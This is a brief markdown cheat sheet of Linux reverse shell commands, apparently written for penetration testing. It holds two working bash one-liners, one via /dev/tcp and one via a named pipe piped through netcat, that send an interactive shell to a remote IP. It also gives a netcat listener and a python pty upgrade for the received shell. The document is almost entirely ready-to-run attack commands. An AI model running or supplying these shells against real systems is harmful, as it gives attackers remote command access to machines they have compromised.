# Linux Reverse Shells

## Bash
```shell
# Option 1
bash -i >& /dev/tcp/192.168.1.9/443 0<&1

# Option 2
cd /tmp; mknod mypipe p; /bin/bash 0< /tmp/mypipe | nc 192.168.1.5 443 1> /tmp/mypipe

# Listener to receive the connection
nc -nvlp 443

# Run this to get a pseudo tty to allow commands like su and sudo 
python -c 'import pty; pty.spawn("/bin/bash")'

# Sets the terminal after spawning the pseudo tty
export TERM=xterm
```